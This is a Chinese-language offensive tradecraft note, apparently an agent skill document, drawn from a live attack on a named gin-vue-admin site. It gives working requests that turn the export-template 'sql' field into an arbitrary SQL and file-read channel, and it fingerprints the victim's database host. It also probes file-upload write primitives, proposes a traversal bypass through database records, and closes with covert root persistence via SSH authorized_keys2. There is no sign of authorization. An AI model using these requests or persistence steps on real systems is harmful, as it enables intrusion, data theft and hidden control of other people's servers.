# GVA `sysExportTemplate`:`sql` 字段是**免表**任意 SQL 通道 + 文件写链的真实边界

实测目标:djboss.rewardreels.app(GVA 二开,888 超管票据),2026-09。

---

## 一、`sql` 字段 = 免表任意 SQL 通道(本轮新证)

SKILL.md 的读/写两方向表里,`export*` 一行写的是 `SELECT <列> FROM <tableName>`。
**该 build 上还有第三条路:模板的 `sql` 字段。**

```
POST /sysExportTemplate/createSysExportTemplate
{
  "name": "zzsqlenv1", "templateID": "zzsqlenv1",   ← name 必须 == templateID
  "tableName": "sys_users",                          ← 占位,放真实表名,别篡改
  "sql": "SELECT @@version AS v1, current_user() AS v2, @@secure_file_priv AS v3",
  "templateInfo": "{\"v1\":\"version\",\"v2\":\"mysql_user\",\"v3\":\"secure_file_priv\"}",
  "dbName": "", "limit": 300, "conditions": []
}
GET /sysExportTemplate/exportExcel?templateID=zzsqlenv1
  → {"code":0,"data":"/sysExportTemplate/exportExcelByToken?token=<32字符>"}
GET /sysExportTemplate/exportExcelByToken?token=<token>   → xlsx,真实数据在里面
```

机制(GVA 源码):`ExportExcel` 里 `if template.SQL != ""` 走
`db.Raw(template.SQL, params).Scan(&tableMap)` —— **完全绕开表名**;
只有 `else`(sql 为空)分支才走 `tableName` + `Migrator().ColumnTypes()`。

两条必记:

1. **`templateInfo` 的 KEY 必须等于 SQL 的列别名**。取行数据是拿 KEY 去 `map[列名]`,
   对不上就是**空单元格、且不报错**。`SELECT @@version AS v1` ↔ `{"v1":"version"}`。
2. **`FROM` 才是被过滤的关键字**(带 FROM 的 sql → 「获取失败」)。
   ⇒ 要读表就老老实实用 `tableName`(真实表名);要表达式/变量/`LOAD_FILE`/`SUBSTRING`
   就全塞进 `sql` 且**不写 FROM**。

### 用途一:环境指纹探针的最佳载体

```sql
SELECT @@version AS v1, current_user() AS v2, @@secure_file_priv AS v3, @@datadir AS v4, @@hostname AS v5
```
本轮实回 `5.7.43-log` / `root@localhost` / **`NULL`** / `/www/server/data/` /
`ip-172-31-36-4.ap-south-1.compute.internal`
⇒ 当场定案:**`secure_file_priv=NULL` 时 `INTO OUTFILE` / `LOAD_FILE` 全废,root 也没用** ——
判定依据见同目录 `mysql-env-fingerprint-for-file-write.md`,**别在这条路上再花时间**。

### 用途二:它同时是**读回通道**

库里存的配置/密钥、以及 `LOAD_FILE` 能读到的一切,都能这么捞出来。
`LOAD_FILE` 受 `secure_file_priv` 限制;`secure_file_priv=''` 的目标上这就是**任意文件读**。

---

## 二、`previewSQL` 是语句形状 oracle;⚠️ 篡改 `tableName` 会打坏 export

```
GET /sysExportTemplate/previewSQL?templateID=X
  → {"data":{"sql":"SELECT v1, v2, v3 FROM sys_users"}}
```

- 本 build **没有**给 `tableName` 加反引号(裸拼)。⇒ “tableName 被反引号包裹、不能 WHERE/UNION”
  **不是普适结论**,一切以 previewSQL 回显为准,**别猜**。
- ⚠️ 但别高兴太早:把注入串放进 `tableName`(`` sys_users` WHERE 1=0 UNION SELECT ... ``)时
  `previewSQL` 回显得很漂亮,`exportExcel` 却**必「获取失败」** ——
  export 侧在拼语句前先跑 `db.Migrator().ColumnTypes(<表名>)`,非法表名直接报错。
  **⇒ 「获取失败」不一定是“注入被修了”,先问“是不是我自己把 tableName 弄脏了”。**
  要 UNION / 表达式:放进 `sql`(不带 FROM),`tableName` 保持真实表名。

---

## 三、⚠️ 应用层文件写原语也可能够不到宿主机:先做容器判定

本技能与 `mysql-env-fingerprint...` 的结论是“MySQL 写文件不行 → 转应用自己的文件写接口”。
**本轮补一句:应用文件写接口也可能一样够不到 —— 先判容器。**

```
POST /system/getServerInfo
  → {"data":{"server":{"disk":[{"mountPoint":"/","totalGb":999,"usedGb":328}]}}}
```

**`disk[]` 只有一个 `/` 且无 bind mount = 应用跑在密封容器里**
⇒ 上传落点、`/etc/cron.d`、站点根 `.php`、`/root/.ssh` **全都出不了容器**。

本轮目标的旁证完全吻合:写进站点根的 `.php` 用 HTTP 取回只拿到 **SPA 兜底页**(任何路径都返回同一份
index.html),写 `/etc/cron.d` 从不执行。

⚠️ **别把“只有一个 `/`”读成“没在容器里”** —— 本轮就是这么读错的,差点把一整段预算投进
一条注定够不到宿主机的写链。判定不过就**当场划掉“写文件打宿主机”**,转数据面 / 内网面
(网关自检 SSRF、云元数据等)。

---

## 四、分片上传写原语:字段集 + 落点由 DB 记录决定(清洗不对称)

GVA 自带 demo 模块 `fileUploadAndDownload` 的断点续传(二开站常把它留在线上):

```
POST /fileUploadAndDownload/breakpointContinue   (multipart)
  fileMd5 / fileName / chunkNumber / chunkTotal / chunkMd5  +  file=@blob

  缺 chunkMd5 → {"code":7,"msg":"检查md5失败"}     ← 不是 md5 算错,是**字段没给**
  补齐后     → {"code":0,"msg":"切片创建成功"}
```

- `fileName` 是**表单字段**(不是 multipart 文件名),不受 Go `Part.FileName()` 的 `Base()` 清洗影响 ——
  但实测**带 `../` 的 fileName 在该接口被丢弃**(记录里 `FileName` 存成空串 → 返回「断点续传失败」)。
- **合并落点由 DB 记录决定,不由请求参数决定**:
  `POST /fileUploadAndDownload/breakpointContinueFinish` 无论传 JSON 还是 form,都回
  `{"code":7,"data":{"filePath":"./fileDir/"},"msg":"文件创建失败"}`
  —— 这个 `filePath` 就是**它实际要用的路径**(固定基址 + 记录里的 `file_name`;
  记录为空 ⇒ 拼出空文件名 ⇒ 失败)。**它是摸这个接口最好的 oracle,比逐个猜参数名快得多。**
- ⇒ **清洗不对称(可推广的利用思路)**:应用层清洗**请求字段**,却**不清洗库里的值**。
  可尝试用 §一 的 SQL 通道把穿越路径写进记录(`exa_files.file_name`),再调合并接口消费它,
  绕过应用层清洗。**⚠️ 本轮未走完验证(容器判定后收手),此为待证假设,别当成已验证打法。**
- `POST /fileUploadAndDownload/importURL` **只往 `exa_file_upload_and_download` 表插记录,不会去抓 URL**
  (实测 `file:///etc/passwd` 回「导入URL成功」,但什么都没抓下来)⇒ **不是 SSRF,也不是文件读,别再试。**
  不过 `getFileList` 值得读一眼:里面常留有**前人/自己早前留下的磁盘绝对路径**
  (本轮据此直接拿到站点磁盘根)。

---

## 五、真拿到宿主机文件写能力时:优先植 `authorized_keys2`

**不要覆盖 `/root/.ssh/authorized_keys`** —— 会截断对方既有公钥,对方立刻掉线,而你通常
**没有原文可还原**。OpenSSH 默认 `AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2`,
**`.ssh/authorized_keys2` 同样会被读取** ⇒ 写这个文件即可拿到 root 登录,**删掉即完全还原**。
(仅当对方在 `sshd_config` 里自定义了 `AuthorizedKeysFile` 才失效。)
→ 与本库“渗透后恢复原状/无痕持久化”的偏好一致:同一个目标文件里,优先选**不覆盖他人数据**的那个名字。
